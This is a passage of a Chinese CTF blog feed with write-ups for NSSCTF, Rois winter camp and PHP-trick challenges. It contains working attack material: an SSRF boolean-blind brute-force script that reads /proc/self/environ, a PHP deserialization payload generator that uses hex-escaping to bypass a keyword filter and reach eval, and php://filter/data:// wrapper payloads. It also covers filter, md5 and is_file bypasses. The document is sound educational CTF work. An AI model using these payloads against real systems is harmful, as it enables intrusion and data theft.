class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&#125;-&#123;&quot;</span><br>flag = <span class="hljs-string">&#x27;NSSCTF&#123;&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> letters:<br>        temp_flag = flag + i<br>        print(<span class="hljs-string">&quot;temp_flag:&quot;</span>, temp_flag)  <span class="hljs-comment"># 打印当前跑出的内容</span><br><br>        data = &#123;<span class="hljs-string">&#x27;url&#x27;</span>: <span class="hljs-string">&#x27;FILE:///proc/self/environ&#x27;</span>, <span class="hljs-string">&#x27;data&#x27;</span>: temp_flag, <span class="hljs-string">&#x27;submit&#x27;</span>: <span class="hljs-string">&#x27;%E6%8F%90%E4%BA%A4&#x27;</span>, &#125;<br>        res = requests.Session()<br>        <span class="hljs-comment">#print(res)</span><br>        res.get(url=url, data=data)  <span class="hljs-comment"># 获取session</span><br><br>        <span class="hljs-comment">#print(str(res.cookies.values())[2:-2])</span><br>        result = requests.get(url=<span class="hljs-string">&quot;http://1.14.71.254:28062/get_hindd_result&quot;</span>,<br>                              cookies=&#123;<span class="hljs-string">&quot;session&quot;</span>: str(res.cookies.values())[<span class="hljs-number">2</span>:<span class="hljs-number">-2</span>]&#125;)<br>        <span class="hljs-comment"># print(result.text)#打印响应内容</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;you get it&quot;</span> <span class="hljs-keyword">in</span> result.text:<br>            flag += i<br>            print(<span class="hljs-string">&quot;flag&quot;</span>, flag)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment"># NSSCTF&#123;04106186-e3b2-4766-ba0b-0064e4bfd705&#125;</span><br></code></pre></td></tr></table></figure><p>运行结果截图</p><p><img src="/2022/03/05/2022/3/NSSCTF-prize4/image-20220305211153994.png" alt="image-20220305211153994"></p><p>这样就可以得到flag</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这道题考点为：python、ssrf、布尔盲注、jwt、session伪造请求登录</p><p>布尔盲注和脚本编写是其中较为简单的点</p><p>关注下这位师傅的博客：<a href="http://www.k1he.cn/">k1he</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF·sql </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Rois-冬令营</title>
      <link href="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/"/>
      <url>/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/</url>
      
        <content type="html"><![CDATA[<p>今天写下writeup总结一下</p><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205214412266.png" alt="image-20220205214412266"></p><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205214430069.png" alt="image-20220205214430069"></p><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205214507437.png" alt="image-20220205214507437"></p><p>这题确实是签到题，不过刚开始没有想到</p><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205214617858.png" alt="image-20220205214617858"></p><p>打开后是这样的</p><p>按照提示输入flag参数</p><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205214651070.png" alt="image-20220205214651070"></p><p>很明显这个javascript弹窗验证了输入flag与校验flag是否一致</p><p>所以不知道flag的前提下无法输入正确</p><p>放弃一段时间后我想起来可以抓包看看，因为这只是一道签到题不会太难考点</p><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215003047.png" alt="image-20220205215003047"></p><p>这是直接送上源码了</p><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215104974.png" alt="image-20220205215104974"></p><h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215145268.png" alt="image-20220205215145268"></p><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215246704.png" alt="image-20220205215246704"></p><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215308960.png" alt="image-20220205215308960"></p><p>通过回显猜测到考点</p><p>xff头的使用</p><p>后面我在同学提醒下才知道可以bp爆破，之前一直手动换ip。。</p><h4 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215904689.png" alt="image-20220205215904689"></p><p>这题是靠搜索出来的</p><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205220015271.png" alt="image-20220205220015271"></p><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205215948168.png" alt="image-20220205215948168"></p><h4 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205220225482.png" alt="image-20220205220225482"></p><p>抓包修改即可</p><h4 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205220249818.png" alt="image-20220205220249818"></p><p>这题稍微麻烦点</p><p>我吸取的教训是bp要用专业版，这样线程才能高，别用什么社区版爆破半天出不来</p><p>爆破设置如图</p><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220207110042677.png" alt="image-20220207110042677"></p><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/notes.md" alt="image-20220207110002361"></p><p>自己尝试写的脚本</p><p>当初没有成功，现在可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>scentence = <span class="hljs-string">&#x27;敏感文件是什么？？常用工具dirsearch  https://github.com/maurosoria/dirsearch/ 下载可能需要科学上网&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">100</span>,<span class="hljs-number">1000</span>):<br>    url1 = <span class="hljs-string">&#x27;http://101.35.106.33:1580/?level1=hello&#x27;</span><br>    payload = &#123;<span class="hljs-string">&#x27;level1&#x27;</span>:<span class="hljs-string">&#x27;world&#x27;</span>, <span class="hljs-string">&#x27;level2&#x27;</span>: i&#125;<br>    r = requests.post(url1, data=payload)<br>    <span class="hljs-comment">#print(r.text)</span><br>    <span class="hljs-keyword">if</span> scentence <span class="hljs-keyword">in</span> r.text:<br>        print(<span class="hljs-string">&quot;爆破数字为&#123;&#125;&quot;</span>.format(i))<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># print(&quot;当前数字&#123;&#125;&quot;.format(i))</span><br>        <span class="hljs-keyword">continue</span><br>        <span class="hljs-comment"># print(&#x27;no&#x27;)</span><br></code></pre></td></tr></table></figure><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220207110330038.png" alt="image-20220207110330038"></p><p>然后这题后面无非是post传参、md5绕过、robots协议、dirsearch扫描之类的小知识点</p><h4 id="6"><a href="#6" class="headerlink" title="6."></a>6.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205220453175.png" alt="image-20220205220453175"></p><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205220509263.png" alt="image-20220205220509263"></p><p>这题属实是有点小坑</p><p>这个$_SERVER[‘QUERY_STRING’]，经过查询是截取get传参？背后的字符串</p><p>下面的if判断是否传进is_admin这个参数，如果没有就完成变量覆盖</p><p>最后变量为真就输出flag</p><p>难点就在前面不能有那个参数，本来按照以前解法就urlencode就可以了</p><p>但是这边已经好心地先帮你decode了</p><p>后面才知道有php有一个特性，就是会将空格解析为_</p><p><a href="https://blog.csdn.net/qq_45521281/article/details/105871192">利用PHP的字符串解析特性绕过Waf_WHOAMIAnony的博客-CSDN博客_php的字符串解析特性</a></p><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221201519.png" alt="image-20220205221201519"></p><h4 id="7"><a href="#7" class="headerlink" title="7."></a>7.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221233952.png" alt="image-20220205221233952"></p><p>md5数组绕过</p><h4 id="8"><a href="#8" class="headerlink" title="8."></a>8.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221310685.png" alt="image-20220205221310685"></p><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221332540.png" alt="image-20220205221332540"></p><p>这题就是明确目标：绕过is_file函数</p><p>查询到文章</p><p><a href="https://www.freebuf.com/articles/web/261379.html">和开发斗智斗勇的日常：PHP is_file()函数绕过 - FreeBuf网络安全行业门户</a></p><p>创造一个不存在路径就可以绕过</p><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221557365.png" alt="image-20220205221557365"></p><h4 id="9"><a href="#9" class="headerlink" title="9."></a>9.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221640928.png" alt="image-20220205221640928"></p><p>万能密码</p><h4 id="10"><a href="#10" class="headerlink" title="10."></a>10.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221707108.png" alt="image-20220205221707108"></p><p>简单的报错查询注入即可</p><h4 id="11"><a href="#11" class="headerlink" title="11."></a>11.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205221735035.png" alt="image-20220205221735035"></p><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br>error_reporting(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Kitten</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> $name;<br>    <span class="hljs-keyword">public</span> $friend;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$word</span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;$name = $word;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">meow</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Meow~ My name is &quot;</span> . <span class="hljs-keyword">$this</span>-&gt;$name . <span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">findFriend</span>(<span class="hljs-params">$sleepingKitten</span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;friend = unserialize($sleepingKitten);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Witch</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> $incantation;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;incantation);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Witch&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params">$sleepingKitten</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/incantation/i&quot;</span>, $sleepingKitten)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;h3&gt;Witchcraft is NOT ALLOWED!&lt;h3&gt;&quot;</span>);<br>    &#125;<br>&#125;<br><br>$pusheen = <span class="hljs-keyword">new</span> Kitten(<span class="hljs-string">&quot;pusheen&quot;</span>);<br>$pusheen-&gt;meow();<br>$sleepingKitten = base64_decode($_POST[<span class="hljs-string">&quot;friend&quot;</span>]);<br>check($sleepingKitten);<br>$pusheen-&gt;findFriend($sleepingKitten);<br>$pusheen-&gt;friend-&gt;meow();<br><br></code></pre></td></tr></table></figure><p>分析一下代码</p><p>最后要成功触发tostring方法执行eval函数才会输出flag</p><p>贴上payload脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Witch</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> $incantation = <span class="hljs-string">&quot;phpinfo();&quot;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Kitten</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> $name;<br>    <span class="hljs-keyword">public</span> $friend;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;$name = <span class="hljs-keyword">new</span> Witch();<br>        <span class="hljs-keyword">$this</span>-&gt;friend = <span class="hljs-string">&quot;1&quot;</span>;<br>    &#125;<br>&#125;<br><br>$b = serialize(<span class="hljs-keyword">new</span> Kitten());<br>$b = str_replace(<span class="hljs-string">&quot;s:18&quot;</span>, <span class="hljs-string">&quot;S:18&quot;</span>, $b);<span class="hljs-comment">//表示字符类型的s大写时，会被当16进制解析</span><br>$b = str_replace(<span class="hljs-string">&quot;incantation&quot;</span>, <span class="hljs-string">&quot;\\69ncantat\\69on&quot;</span>, $b);<span class="hljs-comment">//运用16进制绕过字符过滤</span><br><span class="hljs-keyword">echo</span> base64_encode($b);<br></code></pre></td></tr></table></figure><h3 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h3><h4 id="1-1"><a href="#1-1" class="headerlink" title="1."></a>1.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205222140518.png" alt="image-20220205222140518"></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">p</span> = <span class="hljs-number">98076983780120527792770458890688780277555823887994682214163454666075869521826187406254142075354923691219183496475686028848162360931603330874280505123843552372958293491848353122538774273040195483023876976399815394023691848915634977595301613954470455946398168537308640467440726111280710149870545973093090456889</span><br><span class="hljs-attr">q</span> = <span class="hljs-number">109128821261524367993374364036752312900012076309330756131518403621847420955028710012028358702633852630087399851151754849147220171122637334312693362040478478695565880745177002757742893966644802468111652889172842876540303217969414827643680547263729238638892692735875504393903671278190481143453326533644387573461</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">8696776091045108490706741201669649821552098817481485617853249715695452117022972197749187352644944365460751251101372390508596189150805218655222108412326856187627845335538773557544760562801719469076203277592589287193986370203119805644848355844583928832131820820974656892977022368839425335996903938252794569016614874508025078423755886667955587053802224154129110315695574349620275748114001260456693435229465252466658050265611351185710207338488975143389774529701841231400140833998139253918045998745339223155390778692014423596594980230369885048851010327175679107067569282667999861554443225979013382555032561744321517672718</span><br></code></pre></td></tr></table></figure><p>py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Decrypt</span>(<span class="hljs-params">c,e,p,q</span>):</span><br>L=(p<span class="hljs-number">-1</span>)*(q<span class="hljs-number">-1</span>)<br>d=gmpy2.invert(e,L)<br>n=p*q<br>m=gmpy2.powmod(c,d,n)<br>flag=str(m)<br>print(<span class="hljs-string">&quot;flag&#123;&quot;</span>+flag+<span class="hljs-string">&quot;&#125;&quot;</span>)<br>print(long_to_bytes(m))<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>p = <span class="hljs-number">98076983780120527792770458890688780277555823887994682214163454666075869521826187406254142075354923691219183496475686028848162360931603330874280505123843552372958293491848353122538774273040195483023876976399815394023691848915634977595301613954470455946398168537308640467440726111280710149870545973093090456889</span><br>q = <span class="hljs-number">109128821261524367993374364036752312900012076309330756131518403621847420955028710012028358702633852630087399851151754849147220171122637334312693362040478478695565880745177002757742893966644802468111652889172842876540303217969414827643680547263729238638892692735875504393903671278190481143453326533644387573461</span><br>e = <span class="hljs-number">0x10001</span><br>c = <span class="hljs-number">8696776091045108490706741201669649821552098817481485617853249715695452117022972197749187352644944365460751251101372390508596189150805218655222108412326856187627845335538773557544760562801719469076203277592589287193986370203119805644848355844583928832131820820974656892977022368839425335996903938252794569016614874508025078423755886667955587053802224154129110315695574349620275748114001260456693435229465252466658050265611351185710207338488975143389774529701841231400140833998139253918045998745339223155390778692014423596594980230369885048851010327175679107067569282667999861554443225979013382555032561744321517672718</span><br>Decrypt(c,e,p,q)<br></code></pre></td></tr></table></figure><h4 id="2-1"><a href="#2-1" class="headerlink" title="2."></a>2.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205222341034.png" alt="image-20220205222341034"></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">n</span> = <span class="hljs-number">83283614719107534991800643035912480346726823839289209334614767173634111928391</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">70586109384880981913502819444082705449386947354232744667244143211827298034941</span><br></code></pre></td></tr></table></figure><p>py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding= utf-8 -*-</span><br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br>e = <span class="hljs-number">0x10001</span><br>n = <span class="hljs-number">83283614719107534991800643035912480346726823839289209334614767173634111928391</span><br>c = <span class="hljs-number">70586109384880981913502819444082705449386947354232744667244143211827298034941</span><br><span class="hljs-comment">#1.将n分解为p和q</span><br>p = <span class="hljs-number">284434381548437927107267673531343782677</span><br>q = <span class="hljs-number">292804316643150613089811685591944680683</span><br><br>phi = (p<span class="hljs-number">-1</span>)*(q<span class="hljs-number">-1</span>)<br><span class="hljs-comment">#2.求d</span><br>d = gmpy2.invert(e,phi)<br><span class="hljs-comment">#3.m=pow(c,d,n)</span><br>m = gmpy2.powmod(c,d,n)<br>flag=str(m)<br>print(<span class="hljs-string">&quot;flag&#123;&quot;</span>+flag+<span class="hljs-string">&quot;&#125;&quot;</span>)<br>print(long_to_bytes(m))<br>print(binascii.unhexlify(hex(m)[<span class="hljs-number">2</span>:]))<br><span class="hljs-comment">#binascii.unhexlify(hexstr):从十六进制字符串hexstr返回二进制数据</span><br><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-trick</title>
      <link href="/2022/01/20/2022/1/notes/"/>
      <url>/2022/01/20/2022/1/notes/</url>
      
        <content type="html"><![CDATA[<p>参考文章：</p><p><a href="https://www.cnblogs.com/iloveacm/category/1791836.html">CTF - 随笔分类 - iloveacm - 博客园 (cnblogs.com)</a></p><h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><p>直接上题目理解</p><p><img src="/2022/01/20/2022/1/notes/image-20220208200041496.png" alt="image-20220208200041496"></p><p>三个参数，两处if语句判断</p><p>很明显第一个if必须达成</p><p>看到了file_get_contents自然想到伪协议的利用</p><p><img src="/2022/01/20/2022/1/notes/image-20220208200239756.png" alt="image-20220208200239756"></p><p>考虑用data协议，将base编码后的数据流传入并且会等于  要求语句</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">text</span>=data://text/plain;base<span class="hljs-number">64</span>,d<span class="hljs-number">2</span>VsY<span class="hljs-number">29</span>tZSB<span class="hljs-number">0</span>byB<span class="hljs-number">0</span>aGUgempjdGY=<br></code></pre></td></tr></table></figure><p>到了下一个if，是检查变量是否传入flag了</p><p>先看到下面有include文件包含，而且提示useless.php，那我们可以伪协议读取一下</p><p><img src="/2022/01/20/2022/1/notes/image-20220208201116686.png" alt="image-20220208201116686"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/conver.base64-encode/</span>resource=useless.php<br></code></pre></td></tr></table></figure><p>读取源码</p><p><img src="/2022/01/20/2022/1/notes/image-20220208201257828.png" alt="image-20220208201257828"></p><p>再参考之前的一段代码</p><p><img src="/2022/01/20/2022/1/notes/image-20220208201333072.png" alt="image-20220208201333072"></p><p>那就是让我们传入序列化数据来读取flag</p><p><img src="/2022/01/20/2022/1/notes/image-20220208201436581.png" alt="image-20220208201436581"></p><p>生成后注意</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">第三层的payuload中，不用伪协议读取uselless.php了，问了大佬才知道，<span class="hljs-built_in">file</span>=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=useless.php只能读取文件内容不能执行，也就事说，在这题里面，如果最终payload需要能够执行Flag类中的东西，就必须要被“包含”而不是“被读取”，所以要用<span class="hljs-built_in">file</span>=useless.php实现flag类中的<span class="hljs-built_in">file</span>-content执行读取flag<br></code></pre></td></tr></table></figure><p>最后payload</p><p>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:%22Flag%22:1:{s:4:%22file%22;s:8:%22flag.php%22;}</p><h2 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h2><p>拿上rois的friend那题来说一下</p><p>思路：既然参数会被反序列化，那在这之前我们肯定得序列化数据</p><p>注意到能不能命令执行前，有一个check会检测是否有类里的变量名</p><p>绕过check再考虑能不能触发tostring里的eval函数完成命令执行</p><p><img src="/2022/01/20/2022/1/notes/image-20220208112853921.png" alt="image-20220208112853921"></p><p>这是Kitten类，看到有一个函数meow()触发后可以echo输出，这很可能就可以达到触发tostring的目的</p><p>接着下面的findFriend就是题目会进行的反序列化，我们序列化即可</p><p><img src="/2022/01/20/2022/1/notes/image-20220208113126070.png" alt="image-20220208113126070"></p><p>这个类的结构较为简单，思考如何触发里面的函数是关键</p><p><img src="/2022/01/20/2022/1/notes/image-20220208113242856.png" alt="image-20220208113242856"></p><p>check函数会对传进来的参数进行检查，我们就得绕过</p><p>先考虑绕过</p><p>采用16进制绕过的方法，将其中的字母i替换为16进制69，然后添加\ \确保转义成功吧（我是这么理解的）</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$a</span> = <span class="hljs-string">&#x27;\\69ncantat\\69on&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="/2022/01/20/2022/1/notes/image-20220208114457841.png" alt="image-20220208114457841"></p><p>之后的这种大小写替换我不太明白</p><p><img src="/2022/01/20/2022/1/notes/image-20220208115403846.png" alt="image-20220208115403846"></p><p>paylaod</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>class Witch<br>&#123;<br>    private $incantation &#x3D; &quot;phpinfo();&quot;;<br>&#125;<br><br>class Kitten<br>&#123;<br>    private $name;<br>    public $friend;<br>    function __construct()<br>    &#123;<br>        $this-&gt;$name &#x3D; new Witch();<br>        $this-&gt;friend &#x3D; &quot;1&quot;;<br>    &#125;<br>&#125;<br><br>$b &#x3D; serialize(new Kitten());<br>$b &#x3D; str_replace(&quot;s:18&quot;, &quot;S:18&quot;, $b);<br>$b &#x3D; str_replace(&quot;incantation&quot;, &quot;\\69ncantat\\69on&quot;, $b);<br>echo base64_encode($b);<br></code></pre></td></tr></table></figure><h2 id="php命令执行"><a href="#php命令执行" class="headerlink" title="php命令执行"></a>php命令执行</h2><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>现已有文件夹收录</p><p><img src="/2022/01/20/2022/1/notes/image-20220208112302049.png" alt="image-20220208112302049"></p><p>认为，sql和反序列化较难，注入有多种形式，而反序列化有unserialize()和phar</p><h2 id="phptrick"><a href="#phptrick" class="headerlink" title="phptrick"></a>phptrick</h2><p>1.extract()、parse_str() 等变量覆盖</p><p>2.弱类型比较</p><ul><li>is_numeric 前后有空格时，不会判断为true</li><li>松散（弱）比较时，两个0e开头的不同哈希会判断为相等</li><li>松散（弱）比较时，非数字的字符串序列和数字比较会自动转换</li><li>strcmp/ereg 等函数在传入参数类型为数组时会有非预期行为</li></ul><p><img src="/2022/01/20/2022/1/notes/image-20220123200022722.png" alt="image-20220123200022722"></p><h2 id="md5比较"><a href="#md5比较" class="headerlink" title="md5比较"></a>md5比较</h2><p><img src="/2022/01/20/2022/1/notes/image-20220207203810625.png" alt="image-20220207203810625"></p><p><a 